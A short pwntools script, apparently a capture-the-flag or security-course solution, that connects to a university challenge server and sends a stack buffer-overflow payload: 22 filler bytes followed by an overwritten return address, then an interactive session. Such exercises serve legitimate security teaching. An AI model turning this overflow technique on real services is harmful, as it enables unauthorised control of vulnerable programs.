from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 25154

### run a remote process
s = remote(SERVER, PORT, timeout=9999)

### run a local process
# s = process('./program/return', shell=True)

### interact with it

# s.recvall()
# s.recvuntil(b'Message : ')
# s.recvline()

input('')

# s.send(129 * b'a' + b'\n')
s.sendline(22 * b'a' + b'\xf1\x86\x04\x08' + b'\n')

s.interactive()
